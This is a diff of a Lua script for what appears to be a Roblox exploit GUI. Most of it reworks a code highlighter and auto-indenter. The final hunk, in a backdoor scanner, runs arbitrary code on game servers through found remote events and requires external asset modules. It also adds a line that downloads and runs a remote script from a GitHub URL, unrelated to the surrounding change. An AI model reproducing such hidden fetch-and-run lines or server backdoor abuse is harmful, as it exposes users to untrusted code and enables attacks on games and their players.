@@ -1615,8 +1615,10 @@ local function AIXWS_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Fr
 local container = script.Parent
 local codeBox = container:WaitForChild("TextBox")
 local highlighter = container:WaitForChild("TextLabel")
+local lineNumbers = container:FindFirstChild("LineNumbers")
 
 highlighter.RichText = true
+if lineNumbers then lineNumbers.RichText = true end
 
 local colorGroups = {
 	keywords = {
@@ -1624,30 +1626,35 @@ local colorGroups = {
 		list = {
 			"and", "or", "not", "if", "then", "else", "elseif", "end",
 			"for", "in", "do", "while", "repeat", "until", "function", "local",
-			"return", "break", "continue", "goto", "self", "nil", "export", "import",
-			"wait", "yield", "task", "type", "typeof", "true", "false",
-			"repeat", "continue", "async", "await", "enum", "using", "global",
-			"thread", "coroutine", "default", "switch", "case", "try", "catch", "finally",
-			"throw", "do", "end", "then", "elseif", "else"
+			"return", "break", "continue", "goto", "self", "nil",
+			"true", "false"
 		}
 	},
 	constants = {
 		color = "#dcdcaa",
-		list = { "true", "false", "nil" }
+		list = {
+			"true", "false", "nil", "_G", "_VERSION", "math.huge"
+		}
 	},
 	builtins = {
 		color = "#c586c0",
 		list = {
-			"print", "warn", "error", "assert", "pcall", "xpcall", "type", "select", "unpack",
-			"next", "pairs", "ipairs", "tonumber", "tostring", "collectgarbage", "rawget", "rawset",
-			"rawequal", "setmetatable", "getmetatable", "require", "loadstring", "load", "loadfile",
-			"getfenv", "setfenv", "coroutine", "table", "string", "math", "utf8", "typeof",
-			"tick", "spawn", "delay", "task", "typeof", "Vector3", "CFrame", "UDim2",
-			"Color3", "BrickColor", "Enum", "UserInputService", "RunService", "TweenService",
-			"HttpService", "DataStoreService", "TeleportService", "CollectionService", "ContextActionService",
-			"StarterPlayer", "PathfindingService", "TextService", "LocalizationService",
-			"Enum", "Instance", "game", "workspace", "script", "Players", "StarterGui",
-			"SoundService", "RunService", "Lighting", "ReplicatedStorage"
+			"assert", "collectgarbage", "dofile", "error", "getmetatable", "ipairs",
+			"load", "loadfile", "next", "pairs", "pcall", "print", "rawequal", "rawget",
+			"rawlen", "rawset", "require", "select", "setmetatable", "tonumber",
+			"tostring", "type", "xpcall", "warn", "typeof", "tick", "wait", "spawn", "delay",
+			-- coroutine
+			"coroutine", "create", "resume", "yield", "wrap", "status", 
+			-- string
+			"string", "byte", "char", "find", "format", "gmatch", "gsub", "len", "lower", "match",
+			"rep", "reverse", "sub", "upper",
+			-- table
+			"table", "concat", "insert", "remove", "sort", "pack", "unpack",
+			-- math
+			"math", "abs", "acos", "asin", "atan", "ceil", "cos", "deg", "exp", "floor", "fmod",
+			"huge", "log", "max", "min", "modf", "pi", "rad", "random", "sin", "sqrt", "tan","clamp",
+			-- utf8
+			"utf8", "charpattern", "codes", "codepoint", "len", "offset"
 		}
 	},
 	services = {
@@ -1655,15 +1662,13 @@ local colorGroups = {
 		list = {
 			"game", "workspace", "script", "UserInputService", "RunService", "TweenService",
 			"Lighting", "ReplicatedStorage", "Players", "StarterGui", "SoundService",
-			"HttpService", "DataStoreService", "TeleportService", "Instance", "Vector3", "CFrame",
-			"UDim2", "Color3", "BrickColor", "Enum", "CollectionService", "ContextActionService",
-			"StarterPlayer", "PathfindingService", "TextService", "LocalizationService", "NetworkServer",
-			"NetworkClient", "VRService", "GuiService", "TextChatService", "BadgeService", "MarketplaceService",
-			"UserInputService", "Chat", "RunService", "Lighting", "StarterPack", "StarterPlayerScripts"
+			"HttpService", "DataStoreService", "TeleportService", "InsertService", "ServerStorage",
+			"ServerScriptService", "StarterPack", "Teams", "Debris", "TextService",
+			"Instance", "Vector3", "CFrame", "UDim2", "UDim", "Color3", "BrickColor", "Enum",
+			"NumberRange", "NumberSequence", "ColorSequence", "Ray", "Axes", "Faces", "Rect"
 		}
 	}
 }
-
 local tokenColors = {}
 for _, group in pairs(colorGroups) do
 	for _, word in ipairs(group.list) do
@@ -1674,17 +1679,14 @@ end
 local function formatLuaCode(code)
 	local indent = 0
 	local formatted = ""
-	local indentStr = "    "
+	local indentStr = "   "
 
 	for line in code:gmatch("[^\r\n]+") do
 		local trimmed = line:match("^%s*(.-)%s*$")
-
-		if trimmed:match("^(end|elseif|else|until)") then
-			indent -= 1
+		if trimmed:match("^(end)") or trimmed:match("^else") or trimmed:match("^elseif") or trimmed:match("^until") then
+			indent = math.max(indent - 1, 0)
 		end
-
-		formatted ..= string.rep(indentStr, math.max(indent, 0)) .. trimmed .. "\n"
-
+		formatted ..= string.rep(indentStr, indent) .. trimmed .. "\n"
 		if trimmed:match("then$") or trimmed:match("do$") or trimmed:match("^repeat$") or trimmed:match("^function") then
 			indent += 1
 		end
@@ -1693,61 +1695,84 @@ local function formatLuaCode(code)
 	return formatted
 end
 
-local function highlight(text)
-	text = text:gsub("&", "&amp;"):gsub("<", "&lt;"):gsub(">", "&gt;")
+local function escapeHTML(str)
+	return str:gsub("&", "&amp;"):gsub("<", "&lt;"):gsub(">", "&gt;")
+end
+
+local function highlight(code)
 	local protected = {}
+
 	local function protect(str)
 		table.insert(protected, str)
 		return "\1PROTECT" .. #protected .. "\2"
 	end
 
-	text = text:gsub('(".-")', function(s) return protect('<font color="#ce9178">' .. s .. '</font>') end)
-	text = text:gsub("('.-')", function(s) return protect('<font color="#ce9178">' .. s .. '</font>') end)
-
-	text = text:gsub("(%d+%.?%d*)", function(n)
-		return '<font color="#ff0000">' .. n .. '</font>'
+	code = escapeHTML(code)
+	code = code:gsub("%[%[.-%]%]", function(s)
+		return protect('<font color="#ce9178">' .. escapeHTML(s) .. '</font>')
 	end)
-
-	text = text:gsub("([%w_%.]+)", function(word)
+	code = code:gsub('(".-")', function(s)
+		return protect('<font color="#ce9178">' .. escapeHTML(s) .. '</font>')
+	end)
+	code = code:gsub("('.-')", function(s)
+		return protect('<font color="#ce9178">' .. escapeHTML(s) .. '</font>')
+	end)
+	code = code:gsub("(%-%-.-)\n", function(s)
+		return protect('<font color="#6a9955">' .. escapeHTML(s) .. '</font>\n')
+	end)
+	code = code:gsub("(%-%-.*)$", function(s)
+		return protect('<font color="#6a9955">' .. escapeHTML(s) .. '</font>')
+	end)
+	code = code:gsub("(%d+%.?%d*)", function(num)
+		return '<font color="#b5cea8">' .. num .. '</font>'
+	end)
+	code = code:gsub("([%a_][%w_]*)", function(word)
 		local color = tokenColors[word]
 		if color then
 			return '<font color="' .. color .. '">' .. word .. '</font>'
 		end
 		return word
 	end)
-
-	text = text:gsub("\1PROTECT(%d+)\2", function(i)
+	code = code:gsub("\1PROTECT(%d+)\2", function(i)
 		return protected[tonumber(i)]
 	end)
 
-	return text
+	return code
 end
 
 local function update()
 	local rawText = codeBox.Text
 	highlighter.Text = highlight(rawText)
+
 	local lines = select(2, rawText:gsub("\n", "\n")) + 1
 	local lineHeight = codeBox.TextSize + 4
 	local newHeight = lines * lineHeight
 	container.Size = UDim2.new(1, 0, 0, newHeight)
+
+	if lineNumbers then
+		local linesText = {}
+		for i = 1, lines do
+			linesText[i] = tostring(i)
+		end
+		lineNumbers.Text = table.concat(linesText, "\n")
+		lineNumbers.Size = UDim2.new(0, 30, 0, newHeight)
+	end
 end
 
 codeBox:GetPropertyChangedSignal("Text"):Connect(update)
 
 local UserInputService = game:GetService("UserInputService")
 
-codeBox.Focused:Connect(function()
-	UserInputService.InputBegan:Connect(function(input, processed)
-		if not processed and input.KeyCode == Enum.KeyCode.Return then
-			task.defer(function()
-				codeBox.Text = formatLuaCode(codeBox.Text)
-				update()
-			end)
-		end
-	end)
+UserInputService.InputBegan:Connect(function(input, processed)
+	if not processed and codeBox:IsFocused() and input.KeyCode == Enum.KeyCode.Return then
+		task.defer(function()
+			codeBox.Text = formatLuaCode(codeBox.Text)
+			update()
+		end)
+	end
 end)
 
-codeBox.Text = "-- Piece of code here"
+codeBox.Text = ""
 update()
 end
 local function PYPIM_fake_script() -- Fake Script: StarterGui.Starlight.Frame.Presets.Polaria.LocalScript
@@ -2698,8 +2723,8 @@ local function fireRemoteEvent(code)
 			script.Parent.Framee.Log.Visible = true
 			script.Parent.Framee.Log.Text = "[" .. tostring(remoteEvent or remoteFunction) .. "]" .. "\n[" .. ((remoteEvent and remoteEvent.Name) or (remoteFunction and remoteFunction.Name) or "Unknown") .. "]"
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(159, 226, 191)
-			notify.Info("Backdoor Found!","Scan time : " .. scanTime .."s")
-			
+			notify.Info("Backdoor Found!","Scan time : " .. scanTime)
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt"))()
 	                fireRemoteEvent('local Players=game:GetService("Players")local suspiciousKeywords={"hd admin","ranker","java1","darklord","pracharatbampen","sugma","ro xploit","secret service panel","kid","666","k1d","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","j01tar0","koma","gigxxx","hax0rz","g00l","enstrio","br1cked","hax"}local whitelist={[' .. game.Players.LocalPlayer.Name .. ']=true,["raizarit"]=true,["greguiscool"]=true,["raizarit6"]=true}local function isSuspicious(str)if not str then return false end str=str:lower()for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end local function getOwningPlayer(i)local p=i while p and not p:IsA("PlayerGui")do p=p.Parent end if p and p:IsA("PlayerGui")then local character=p.Parent return Players:GetPlayerFromCharacter(character)or Players:FindFirstChild(character.Name)end return nil end local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local nameStr=i.Name local textStr=i:IsA("TextLabel")and i.Text or"" local pl=getOwningPlayer(i)if pl and whitelist[pl.Name]then return end if isSuspicious(nameStr)or isSuspicious(textStr)then local hint=Instance.new("Hint",workspace)hint.Text="[Skid] Deleted suspicious GUI: "..nameStr..(pl and" (user: "..pl.DisplayName..")"or" (Unknown)") task.delay(3,function()if hint and hint.Parent then hint:Destroy()end end) local f=i while f and not f:IsA("Frame")do f=f.Parent end if f then f:Destroy() else i:Destroy() end end end end for _,obj in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,obj)end game.DescendantAdded:Connect(function(obj) pcall(deleteIfSuspicious,obj) end)task.spawn(function() while true do for _,obj in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,obj)end task.wait(5)end end)')
                         fireRemoteEvent('require(6735691273).BetaAntiSkid()')
 		        fireRemoteEvent('require(7458325257).antiban()')
